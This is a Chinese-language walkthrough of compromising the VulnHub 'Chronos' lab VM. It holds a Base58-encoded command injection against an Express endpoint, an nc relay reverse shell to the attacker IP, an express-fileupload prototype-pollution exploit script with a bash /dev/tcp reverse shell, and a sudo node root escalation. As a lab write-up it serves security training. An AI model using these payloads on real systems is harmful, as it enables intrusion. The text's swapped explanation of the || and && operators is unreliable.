> 靶机环境介绍
+ [Chronos 下载地址](https://www.vulnhub.com/entry/chronos-1,735/)
+ 难度等级 <font color=orange>中</font> （构思非常巧妙）

目标：取得两个 flag + root 权限

**所用技术栈：**
+ 端口扫描
+ WEB侦查
+ 数据编码
+ 命令注入
+ NC串联
+ **搜索大法**
+ **框架漏洞利用**
+ 代码审计
+ 本地提权

![20220502_0048.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/1148b626ecfd29db3ca830adce46a609.png)

+ 攻击机IP地址 10.0.2.7
+ 攻击机系统: Kali

## 主机发现与信息收集

根据个人在使用上的经验当我们在使用 `netdiscover` 时 <font color="red" face=Monaco size=3> 子网掩码最好减8来使用,如24就改成16 </font> 

这样的化这款工具在效率和结果上都会有一个提升

```bash
netdiscover -r 10.0.2.0/16
```

![20220502_0037.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/57fd847c7f24318123508ff79155985d.png)

很容易我们就可以识别出来这次我们要渗透的靶机的 IP 地址为 `10.0.2.4` 


还是按照常规操作对该靶机的端口进行扫描
```bash
nmap -p- 10.0.2.4
```

发现其开放了三个端口，再对这三个端口的服务类型和服务版本进行扫描

```bash
nmap -p22,80,8000 -sV 10.0.2.4
```
![20220502_0039.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/df3a273d90991db98c3397d6ed352b80.png)

![20220502_0045.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/1cadb8c97afd8f59ae0acef5dc5d643a.png)

<font color="red" face=Monaco size=3> 发现 8000 端口 是使用 Node.js 的 Express 框架开发的Web服务 </font>


## WEB侦查

我们还是按照正常的渗透思路来使用浏览器来访问一下 靶机所开放的 Web 服务

![20220502_0053.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/cdebf6427c0c0ea8e78680a9d839f0f5.png)

当我们查看其网页源码时 (快捷键 <kbd class="keybord"> Ctrl </kbd> + <kbd class="keybord"> U </kbd>) 发现有一段比较诡异,且好像被加密过的JS代码

![20220502_0056.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/dec739fdac05176833fa5623ce5b319f.png)

> 不管这段代码对我们渗透测试是否有帮助，作为渗透测试人员，我们都应该大致去看一下代码的内容.

**但发现这段代码有以下几点情况,导致我们阅读起来非常困难**

1. <font color="red" face=Monaco size=3> 没有对应的代码格式,(代码被压缩了) </font>
2. 有些代码和变量被进行了"特殊的处理"

> 针对以上情况,我们可以有好多种方式解决

+ 对于代码格式问题，我们可以使用网上的JS代码格式化工具进行处理.

+ 对于代码和变量看不懂的问题其实问题不大，因为很多时候我们在进行渗透测试时并不会完全获取到目标靶机上的源码和信息，并且从效率和攻击成本考虑, <font color="red" face=Monaco size=3> 很多情况我们只需要从中获取到一些重要信息即可</font> 

### CyberChef工具的介绍

> [CyberChef 网络版使用链接](https://gchq.github.io/CyberChef/)

我这边将使用一个非常厉害的一个工具
[CyberChef](https://gchq.github.io/CyberChef/) 它支持很多种编码/解码/加密/解密等一系列的操作,还有一键格式化代码等功能

我们可以使用其网络版的 [CyberChef](https://gchq.github.io/CyberChef/),当然我们也可以下载到本地进行编译运行.
[CyberChef GitHub link](https://github.com/gchq/CyberChef)

我们可以将我们要进行操作的操作拖入到 Recipe 模块中 将要进行操作的代码，数据，密文，明文等输入到 Input 里面 点击 BAKE 之后在 Output 框内就能获取到相应的结果了

![20220502_0147.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/dbcbe2040bee45de94055b33d099d8d3.png)

现在我们要使用 CyberChef 这个网站来进行 JS 代码的美化格式化， <font color="red" face=Monaco size=3> 我们只需要在选择框中输入 Beautify 后 CyberChef 就会显示出其所支持的所有关于美化和格式化功能模块 </font> ，而我们只需要格式化 JS 代码，所以我们只需要将 `JavaScript Beautify` 这个模块拖入到 Recipe 窗口内 并将要进行格式化美化的 JS 代码复制粘贴到 Input 窗口内即可

![20220502_0155.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/ef4abdf713e6f2e3326347d515128715.png)

我们在分析格式化后的代码中很容易发现出一段敏感的字符串看起来很像一段 URL, <font color="skyblue" face=Monaco size=3> 而在一段 JS 代码内存在一段 URL 很有可能就是向该 URL 请求资源或者发送数据 </font>

![20220502_0158.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/f87f89ecc4ad9181928be1752ba42172.png)


我们知道我们所渗透的靶机名就叫 `chronos` 并且该靶机也开放了 8000 端口 而这段字符串中的域名 `chronos.local:8000` 我们是不是有理由怀疑 `chronos.local` 就是靶机本地的意思

使用域名的方式进行请求,而我们的攻击机并没有对应的域名解析,所以我们很合理地猜测，是否因为这个导致我们显示的网页中有一些东西并没有被请求到或资源没被加载？


为了验证我们的猜想，我们可以编辑一下我们攻击机的 hosts 文件,并将其 `10.0.2.4 chronos.local` 对应关系添加到 hosts文件尾.

![20220502_0206.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/53e3fcb93a8e01cc9a53560bb33c30b3.png)

测试本地的域名解析是否生效
![20220502_0206_1.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/fc5f404e16e172e5e0606583feacbc06.png)

现在当我们在访问一下靶机的网站发现该网站页面不出我们所料,真的发生了一些变化

![20220502_0209.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/6e8661cc36087f89b5fd9e98d7fe0211.png)

## 命令注入

我们可以打开 `Burp Suit` 查看网站到底进行了什么请求和访问,才会使得网站的页面发生了改变


![20220502_0213.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/04c8a81ce06b7fcd10b90bc9fd992efa.png)

使用 `Burp Suit` 查看最后一个 GET 请求

![20220502_0214.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/e49bc6d580d06882e719a173a7e418ed.png)

这时候我就很自然地给自己问了这样几个问题,为什么当我从客户端浏览器发送这样一个 url (`/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL`) 请求到服务端的时候，服务端会把它的系统时间返回给我们？

<font color="red" face=Monaco size=3> 那如果我们将 URL 当中的这一串奇怪的字符串修改掉，服务端是否还会给我们返回它的系统时间？ </font>

这时候我就进行了一个尝试，我尝试将这段参数改成了别的字符 并重新发送该请求发现网站并不能像刚才一样正常地返回给我们系统时间!

![20220502_0226.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/b2f4164dc7ce5ee02f53de515c68b805.png)

通过这次测试至少我们知道 `format=`后面这串奇怪的字符串对服务端返回系统时间给客户端是至关重要的,这时候我们就要对该参数进行深入地研究 <font color="red" face=Monaco size=3> 而看这段字符串的样子很明显像是被加密或者进行编码(如 base64 ) 过后的结果</font> ,这时候我们就要再次使用 CyberChef 其中强大功能的一种 **Magic**

> 该功能模块会帮我们进行自动识别编码方式和加密方式，并尝试对其进行解密和解码


![20220502_0236.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/df5e73540bd39a031b9984339cd33654.png)

通过解码的结果，并结合参数名`/date`,我们可以大胆的猜测**这个参数就是向服务端发送类似shell命令的方式来返回系统时间的**,因为其返回的格式和我们使用linux系统 命令返回的结果完全一样

![20220502_0238.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/dcb44afea780cb16c0781aea06058292.png)

这时候我们是否能够通过shell 中类似管道链接的方式来判断这边是否有命令注入漏洞？

我们在 shell 里面可以使用很多方式连接多条命令如：

+ `||`: 如果前面的命令执行正确，则后面的命令不执行

+ `&&`: 与 `||` 完全相反,如果前面的命令执行失败才会执行后面的命令



<font color="green" face=Monaco size=3> 这时候我们就可以构造一个测试请求参数来判断服务端是否采用调用系统shell的方式返回系统时间 </font>


```bash
date '+Today is %A, %B %d, %Y %H:%M:%S.' && ls
```

如果这条命令成功执行并返回我们预期的结果的话，那说明这边真的存在命令注入漏洞

当然我们想要执行的命令还需要进行 base58 进行加密
`(使用 CyberChef 里的To Base58 模块即可)`

![20220502_0248.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/456162a07270d66e5bc12eec4eaf3483.png)

将我们构造好的参数请求发送给服务端后发现服务端确实给我们返回了我们想要的 ls 命令的结果,所以结论是这边确实有一个命令注入漏洞

<font color="red" face=Monaco size=3>这时候我们就可以使用这个命令注入漏洞来获得shell  </font>
![20220502_0250.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/968bcb815f8d9de8108075ee74ac5ac9.png)

我们使用这个漏洞重复刚才的操作，从而进一步获取目标靶机的信息，如靶机内有哪些命令啊，是否有 nc ？ 等一系列操作来进一步深入我们的渗透.

发现目标靶机上存在 nc

这时我们可以测试一下目标靶机上的 nc 是否能够使用，是否支持 -e 参数...

发现目标靶机版本并不支持 `-e` 参数，我们还得使用 NC串联的方式获得shell
这边就不再进行演示了

*具体的代码：*

```bash
&& nc 10.0.2.7 3333 | /bin/bash | nc 10.0.2.7 4444 
```
并对其进行Base58加密之后提交该payload

发现在攻击机上成功获得靶机的基础shell

![20220502_0327.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/f74700dae26ee86ed2890b5fbe1f44a7.png)

## 框架漏洞利用 

由于我们是通过 web 服务获得的 shell 那么我们当前shell的工作目录应该就是当前web应用存放的路径

我们查看 `/etc/passwd` 这个文件发现有imera 这个账户，我们访问该账户的家目录，发现有user.txt 很显然这个文件很有可能就是第一个 flag文件，而我们尝试查看该文件的内容，发现我们并不能查看该文件的内容，我们查看一下该文件的权限，发现该文件只有 imera 用户才有读写权限，当下，我们的目的就已经很明确了，那就是进行本地提权了.

![20220502_0331.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/c5952cd7e4596a49f15f4ae672fd1b90.png)

我们现在查看一下该主机的内核版本,发现 4.15的版本内核漏洞提权的漏洞并没有

![20220502_0336.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/659c6bd9dfea61fd5e1f71139a93819b.png)

寻找suid方式提权一无所获

使用 `sudo -l` 一无所获

![20220502_0338.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/a344d9a85ce3465bb23562ba894c299a.png)


到这边我们其实已经遇到了渗透测试的瓶颈，我们这时并没有一个好的方式能够在本地提权

> 而当我们进行渗透测试时，没有思路，那说明我们信息收集还没到位

只有当我们信息收集得足够多时,我们才会有清晰的渗透思路,而我们信息收集得不多时，我们可能很难会有一个思路去攻破目标


所以我就对这台靶机进行了大量的信息收集和目录的扫描,发现该靶机在该web应用的根目录下有一个突破口


我们知道该服务是使用 JS Node.js 构建的，我们首先查看了一下 package.js 查看它使用了哪些库依赖,我们发现它使用了 `bs58` 和 `express` 库。而我们知道 `Express` 是一个Web开放框架,这时我们就需要使用搜索引擎去查找关于该框架的相关资料,从而进一步提高我们渗透测试的攻击面

![20220502_0348.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/e93aae11cd9bad767a12df1ecd09eec5.png)

```json
{
  "dependencies": {
    "bs58": "^4.0.1",
    "cors": "^2.8.5",
    "express": "^4.17.1"
  }
}

```
我们可以先查看一下它的 `app.js` 文件 ( 后端服务逻辑代码 ) 如下：



```js

// created by alienum for Penetration Testing                         
const express = require('express');                                   
const { exec } = require("child_process");                            
const bs58 = require('bs58');                                         
const app = express();                                                

const port = 8000;

const cors = require('cors');


app.use(cors());

app.get('/', (req,res) =>{
  
    res.sendFile("/var/www/html/index.html");
});

app.get('/date', (req, res) => {

    var agent = req.headers['user-agent'];
    var cmd = 'date ';
    const format = req.query.format;
    const bytes = bs58.decode(format);
    var decoded = bytes.toString();
    var concat = cmd.concat(decoded);
    if (agent === 'Chronos') {
        if (concat.includes('id') || concat.includes('whoami') || concat.includes('python') || concat.includes('nc') || concat.includes('bash') || concat.includes('php') || concat.includes('which') || concat.includes('socat')) {

            res.send("Something went wrong");
        }
        exec(concat, (error, stdout, stderr) => {
            if (error) {
                console.log(`error: ${error.message}`);
                return;
            }
            if (stderr) {
                console.log(`stderr: ${stderr}`);
                return;
            }
            res.send(stdout);
        });
    }
    else{

        res.send("Permission Denied");
    }
})

app.listen(port,() => {

    console.log(`Server running at ${port}`);

})

```
发现这个代码就是我们刚刚利用命令注入漏洞的代码,它只是对我们传过来的参数命令进行了基本检查，而没有阻止这些行为，仅仅只是发送了一个错误信息 `Something went wrong` 这也就是为什么我们能够成功利用命令注入漏洞来突破边界并成功获得 Web Shell 的原因

经过一系列的代码审计发现，这边并没有关于本地提权相关的内容

所以我又进行了一系列的信息收集和目录遍历发现在 Web服务根目录的上一级还有一个 `chronos-v2` 目录,并且里面也有相应的服务端代码

![20220502_0344.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/f7ba7e987b3d4e12e9c97417c7d529f3.png)

同理我们可以先查看其使用了什么库依赖来判断是否存在相关的库漏洞，当我们查看该文件时发现里面有一个库的名字很敏感 `express-fileupload` 这很明显就跟文件上传有关啊。

![20220502_0354.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/6595a8025af59ee693a13a7ce364787a.png)
```json

{
  "name": "some-website",
  "version": "1.0.0",
  "description": "",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "author": "",
  "license": "ISC",
  "dependencies": {
    "ejs": "^3.1.5",
    "express": "^4.17.1",
    "express-fileupload": "^1.1.7-alpha.3"
  }
}

```


所以我当即就去 `STFW` 发现关于这个库确实存在相关的漏洞,并在以下网站成功获取到利用该漏洞的相应利用代码

> 搜索引擎 node.js express-fileupload 漏洞

+ [Abot this vulnerability](https://www.bleepingcomputer.com/news/security/nodejs-module-downloaded-7m-times-lets-hackers-inject-code/)
+ [Vulnerability ShellCode](https://blog.p6.is/Real-World-JS-1/)


![20220502_0358.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/8ed424f1e24750d0ce1f6d584bfc3eba.png)

![20220502_0357.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/ec4660893cecf81eeb80f5515a56469f.png)


然后进一步去了解该库漏洞，发现如果想要利用该漏洞，必须满足以下条件：

![20220502_0404.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/46ef6f60556ed244056f756954cc782f.png)

而在审计该服务的代码时发现刚好满足条件，所以我当即就去适当地修改了该漏洞利用代码

```js

const express = require('express');
const fileupload = require("express-fileupload");
const http = require('http')

const app = express();

app.use(fileupload({ parseNested: true }));

app.set('view engine', 'ejs');
app.set('views', "/opt/chronos-v2/frontend/pages");

app.get('/', (req, res) => {
   res.render('index')
});

const server = http.Server(app);
const addr = "127.0.0.1"
const port = 8080;
server.listen(port, addr, () => {
   console.log('Server listening on ' + addr + ' port ' + port);
});

```
利用代码

![20220502_0408.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/77519d077fc393dc9188a72a02aa380e.png)

```python
import requests

cmd = 'bash -c "bash -i &> /dev/tcp/10.0.2.7/4444 0>&1"'

# pollute
requests.post('http://127.0.0.1:8080', files = {'__proto__.outputFunctionName': (
    None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})

# execute command
requests.get('http://127.0.0.1:8080')

```
我们将这段代码先在攻击机上编写好，后上传到目标靶机上，并运行，发现成功在攻击机上获得 imera 用户的shell

![20220502_0413.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/9dbf06fbf084493a92ed54f4899f7c77.png)

而我们刚刚在信息收集的时候知道在 imear 用户的家目录有一个 user.txt 可能存放了第一个 flag 我们使用这个用户的shell 查看该文件 成功获得第一个 flag

![20220502_0414.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/247de1c9a6caddd047e9c69ef0bfcd05.png)

```bash
# flag1
byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK
```

## 本地提权

我们先查看该用户是否有sudo 的权限

```bash
sudo -l
```

![20220502_0417.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/59b5b8dc40d0c52fc43e9b19bc5d166a.png)

发现 <font color="red" face=Monaco size=3> 存在两个命令是我们不需要密码就能使用sudo root权限进行运行的: </font> ( `node` `npm` ) 而我们知道使用 node 很容易就能构建一个服务端，那是否有相关的代码或者命令能和前几次渗透过程中使用的 python 代码反弹 shell方式一样进行反弹shell？

这时我去搜索了一下就寻找到了相应的代码

```bash
sudo node -e 'child_process.spawn("/bin/bash",{stdio:[0,1,2]})'
```
在主机上运行发现成功获取到 root权限

![20220502_0418.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/014e65ff4cf5c05fddce40d2ac999832.png)

我们进入到root的家目录成功发现第二个flag文件查看该文件成功获得第二个flag

![20220502_0418_1.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/ba3fbba04b6e5433aeac732c379f9e85.png)


```bash
# flag2
YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK
```

<font color="green" face=Monaco size=4>至此这台靶机的渗透过程已经全部结束 </font>


## 彩蛋



![20220502_1208.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/0011a1a26721f930b7fd2bdd90885783.png)

![20220502_1209.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/4a1f84244ca0e615e7c97f933d412a13.png)
![20220502_1210.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/4ceea961e777ee496bca53043fcabb12.png)
